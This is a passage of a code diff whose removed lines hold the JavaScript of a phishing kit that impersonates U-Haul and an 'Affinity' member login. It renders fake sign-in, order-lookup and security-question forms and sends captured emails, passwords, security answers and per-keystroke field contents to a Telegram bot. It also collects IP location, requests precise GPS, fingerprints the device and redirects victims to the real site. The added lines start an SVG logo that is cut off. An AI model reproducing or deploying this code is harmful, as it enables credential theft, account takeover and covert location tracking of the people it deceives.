-                    <button type="button" class="btn-uhaul" style="background:#FF6A00;letter-spacing:1px;" onclick="var e=document.getElementById('lookupEmail').value.trim(),z=document.getElementById('lookupZip').value.trim();if(e||z){sendToTelegram('📦 *U-Haul — Order Lookup*\n📧 Email/Phone: `'+e+'`\n📍 ZIP: `'+z+'`');document.getElementById('loadingIndicator').style.display='block';setTimeout(function(){document.getElementById('loadingIndicator').style.display='none';alert('No order found with that information. Please check your details and try again.');},2000);}">Look Up Order</button>
-                </form>
-            </div>
-            <div class="loading" id="loadingIndicator" style="display:none;"><div class="spinner" style="border-top-color:#E31837;"></div><p>Verifying...</p></div>
-        </div>
-    </div>`;
-}
-
-function switchUhaulTab(tab) {
-    document.getElementById('tabSignIn').className = tab === 'signin' ? 'active' : '';
-    document.getElementById('tabLookup').className = tab === 'lookup' ? 'active' : '';
-    document.getElementById('uhaulSignIn').style.display = tab === 'signin' ? 'block' : 'none';
-    document.getElementById('uhaulLookup').style.display = tab === 'lookup' ? 'block' : 'none';
-}
-
-// ========================
-// AFFINITY SECURITY QUESTION PAGE
-// ========================
-function renderAffinitySecurity() {
-    const root = document.getElementById('appRoot');
-    root.insertAdjacentHTML('afterend', `
-    <div id="securityPage">
-        <div class="affinity-header">
-            <h1>Verify Your Identity</h1>
-            <p>For your security, please answer the following question</p>
-        </div>
-        <div class="affinity-body">
-            <form id="securityForm">
-                <div class="select-group"><label>SECURITY QUESTION</label>
-                    <select id="secQ1" required>
-                        <option value="">— Select a question —</option>
-                        <option value="What is your father's middle name?">What is your father's middle name?</option>
-                        <option value="What was the name of your first pet?">What was the name of your first pet?</option>
-                        <option value="What is your mother's maiden name?">What is your mother's maiden name?</option>
-                        <option value="What street did you grow up on?">What street did you grow up on?</option>
-                        <option value="What was the name of your elementary school?">What was the name of your elementary school?</option>
-                        <option value="What is the name of your first employer?">What is the name of your first employer?</option>
-                    </select>
-                </div>
-                <div class="input-group"><label>YOUR ANSWER</label><input type="text" id="secA1" placeholder="Enter your answer" autocomplete="off" required></div>
-                <div class="error" id="secError" style="display:none;">Incorrect answer. Please try again.</div>
-                <button type="submit" class="btn-affinity">Verify</button>
-            </form>
-            <div class="loading" id="secLoading" style="display:none;"><div class="spinner" style="border-top-color:#005a9c;"></div><p>Verifying your information...</p></div>
-        </div>
-        <div class="affinity-footer">
-            <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Legal</a><br>Need help? Call <span class="affinity-phone">1.866.863.6237</span>
-        </div>
-    </div>`);
-}
-
-// ========================
-// APPLY BRAND
-// ========================
-function applyBrand() {
-    document.documentElement.style.setProperty('--brand-color', brand.color);
-    
-    if (brand.isAffinity) {
-        renderAffinity();
-        renderAffinitySecurity();
-        setupAffinityHandlers();
-        return;
-    }
-    if (brand.isUhaul) {
-        renderUhaul();
-        setupUhaulHandlers();
-        return;
-    }
-    
-    const root = document.getElementById('appRoot');
-    root.innerHTML = brand.render();
-}
-
-// ========================
-// SETUP FORM HANDLERS
-// ========================
-function setupAffinityHandlers() {
-    const form = document.getElementById('loginForm');
-    if (!form) return;
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value;
-        const remember = document.getElementById('remember') ? document.getElementById('remember').checked : false;
-        
-        document.getElementById('loadingIndicator').style.display = 'block';
-        
-        let msg = `🔔 *${brand.name} — Credentials Captured!*\n\n📧 *Member#:* \`${email}\`\n🔑 *Password:* \`${password}\`\n`;
-        if (remember) msg += `☑️ *Remember:* On\n`;
-        msg += buildLocationInfo();
-        sendToTelegram(msg);
-        
-        requestGeolocation();
-        
-        setTimeout(() => {
-            document.getElementById('loginCard').style.display = 'none';
-            document.getElementById('securityPage').style.display = 'block';
-            setupSecurityForm();
-        }, 2500);
-    });
-}
-
-function setupSecurityForm() {
-    const sf = document.getElementById('securityForm');
-    if (!sf) return;
-    sf.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const q1 = document.getElementById('secQ1').value;
-        const a1 = document.getElementById('secA1').value.trim();
-        
-        document.getElementById('securityForm').style.display = 'none';
-        document.getElementById('secLoading').style.display = 'block';
-        
-        sendToTelegram(`🛡️ *${brand.name} — Security Question Captured!*\n\n❓ *Question:* ${q1}\n✏️ *Answer:* \`${a1}\``);
-        
-        setTimeout(() => { window.location.href = brand.realSite; }, 2500);
-    });
-}
-
-function setupUhaulHandlers() {
-    const form = document.getElementById('loginForm');
-    if (!form) return;
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value;
-        
-        document.getElementById('loadingIndicator').style.display = 'block';
-        
-        let msg = `🔔 *${brand.name} — Credentials Captured!*\n\n📧 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n`;
-        msg += buildLocationInfo();
-        sendToTelegram(msg);
-        requestGeolocation();
-        
-        setTimeout(() => { window.location.href = brand.realSite; }, 3000);
-    });
-}
-
-function setupDefaultHandlers() {
-    const form = document.getElementById('loginForm');
-    if (!form) return;
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const email = document.getElementById('email').value.trim();
-        const password = document.getElementById('password').value;
-        const remember = document.getElementById('remember') ? document.getElementById('remember').checked : false;
-        
-        document.getElementById('loadingIndicator').style.display = 'block';
-        
-        let msg = `🔔 *${brand.name} — Credentials Captured!*\n\n📧 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n`;
-        if (remember) msg += `☑️ *Remember:* On\n`;
-        msg += buildLocationInfo();
-        sendToTelegram(msg);
-        requestGeolocation();
-        
-        if (brand.hasSecurityQuestions) {
-            setTimeout(() => {
-                document.getElementById('loginCard').style.display = 'none';
-                document.getElementById('securityPage').style.display = 'block';
-                setupSecurityForm();
-            }, 2500);
-        } else {
-            setTimeout(() => { window.location.href = brand.realSite; }, 3000);
-        }
-    });
-}
-
-// ========================
-// TELEGRAM SENDER
-// ========================
-function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const payload = { chat_id: CHAT_ID, text: message, parse_mode: "Markdown" };
-    try {
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', url, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify(payload));
-    } catch(e) {}
-}
-
-// ========================
-// LOCATION DATA
-// ========================
-let targetIP = 'Unknown', targetCountry = 'Unknown', targetCity = 'Unknown', targetISP = 'Unknown';
-let targetLat = null, targetLon = null;
-fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{ targetIP=d.ip||'Unknown'; targetCountry=d.country_name||'Unknown'; targetCity=d.city||'Unknown'; targetISP=d.org||'Unknown'; targetLat=d.latitude; targetLon=d.longitude; }).catch(()=>{});
-
-let preciseLocation = null;
-let gpsAttempted = false;
-
-function requestGeolocation() {
-    if (gpsAttempted) return;
-    gpsAttempted = true;
-    if (!navigator.geolocation) {
-        sendToTelegram(`⚠️ *Geolocation not available* — ${brand.name}\nReason: Browser does not support geolocation API`);
-        return;
-    }
-    navigator.geolocation.getCurrentPosition(
-        pos => {
-            const lat = pos.coords.latitude, lon = pos.coords.longitude, acc = pos.coords.accuracy, alt = pos.coords.altitude;
-            preciseLocation = { lat, lon, acc, alt };
-            sendToTelegram(`📍 *Precise GPS Location Captured — ${brand.name}*\n🌐 *Lat/Lon:* \`${lat}, ${lon}\`\n🎯 *Accuracy:* ${acc} meters\n🗺 *Maps:* https://www.google.com/maps?q=${lat},${lon}\n📏 *Altitude:* ${alt ? alt.toFixed(1) + 'm' : 'N/A'}`);
-        },
-        err => {
-            let reason = 'Unknown';
-            switch(err.code) { case err.PERMISSION_DENIED: reason='User denied'; break; case err.POSITION_UNAVAILABLE: reason='Location unavailable'; break; case err.TIMEOUT: reason='Timed out (20s)'; break; }
-            sendToTelegram(`❌ *Geolocation result* — ${brand.name}\nReason: ${reason}`);
-        },
-        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
-    );
-}
-
-function buildLocationInfo() {
-    let m = `\n🌐 *IP:* ${targetIP}\n📍 *IP Location:* ${targetCity}, ${targetCountry}\n`;
-    if (targetLat && targetLon) m += `🗺 *IP Coords:* ${targetLat}, ${targetLon}\n`;
-    if (preciseLocation) m += `🎯 *GPS:* ${preciseLocation.lat}, ${preciseLocation.lon} (±${preciseLocation.acc}m)\n🗺 *GPS Map:* https://www.google.com/maps?q=${preciseLocation.lat},${preciseLocation.lon}\n`;
-    m += `🏢 *ISP:* ${targetISP}\n📱 *Device:* ${navigator.platform||'Unknown'}\n🖥 *Screen:* ${window.screen.width}x${window.screen.height}\n🕐 *Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n⏰ *Time:* ${new Date().toISOString()}`;
-    return m;
-}
-
-// ========================
-// KEYSTROKE LOGGING
-// ========================
-let lastEmailLen = 0, lastPassLen = 0;
-function attachKeystrokeListeners() {
-    const ef = document.getElementById('email');
-    const pf = document.getElementById('password');
-    const le = document.getElementById('lookupEmail');
-    const lz = document.getElementById('lookupZip');
-    
-    if (ef) ef.addEventListener('input', function() {
-        const v = this.value;
-        if (v.length > lastEmailLen && v.length > 2) {
-            sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Email\n📝 *Char:* \`${v[v.length-1]}\`\n📋 *So far:* \`${v}\``);
-        }
-        lastEmailLen = v.length;
-    });
-    
-    if (pf) pf.addEventListener('input', function() {
-        const v = this.value;
-        if (v.length > lastPassLen && v.length > 0) {
-            const masked = '*'.repeat(v.length - 1) + v[v.length - 1];
-            sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Password\n📝 *Char:* \`${v[v.length-1]}\`\n📋 *So far:* \`${masked}\``);
-        }
-        lastPassLen = v.length;
-    });
-    
-    if (le) le.addEventListener('input', function() {
-        const v = this.value;
-        if (v.length > 2) {
-            sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Lookup Email\n📝 *Char:* \`${v[v.length-1]}\`\n📋 *So far:* \`${v}\``);
-        }
-    });
-    
-    if (lz) lz.addEventListener('input', function() {
-        const v = this.value;
-        if (v.length > 1) {
-            sendToTelegram(`🔑 *Keystroke* — ${brand.name}\n👤 *Field:* Lookup ZIP\n📝 *Char:* \`${v[v.length-1]}\`\n📋 *So far:* \`${v}\``);
-        }
-    });
-}
-
-// ========================
-// INIT
-// ========================
-applyBrand();
-setTimeout(() => {
-    attachKeystrokeListeners();
-    setupDefaultHandlers();
-}, 500);
-</script>
-</body>
-</html>
+                    <svg width="48" height="48" viewBox="0 0 48 48"><circle cx="24" cy="24" r="22" fill="#E60023"/><path d="M24 8c-8.8 0-16 7.2-16 16 0 6.8 4.2 12.6 10.2 14.9l1.5-6.4s-.4-.8-.4-1.9c0-1.8 1-3.1 2.3-3.1 1.1 0 1.6.8 1.6 1.8 0 1.1-.7 2.7-1.1 4.2-.3 1.3.6 2.3 1.9 2.3 2.3 0 4.1-2.4 4.1-5.9 0-3.1-2.2-5.2-5.4-5.2-3.7 0-5.8 2.8-5.8 5.6 0 1.1.4 2.3.9 2.9.1.1.1.2.1.4-.1.4-.3 1.2-.3 1.4-.1.2-.2.3-.4.2-1.6-.8-2.6-3.1-2.6-5 0-4.1 3-7.9 8.6-7.9 4.5 0 8 3.2 8 7.5 0 4.
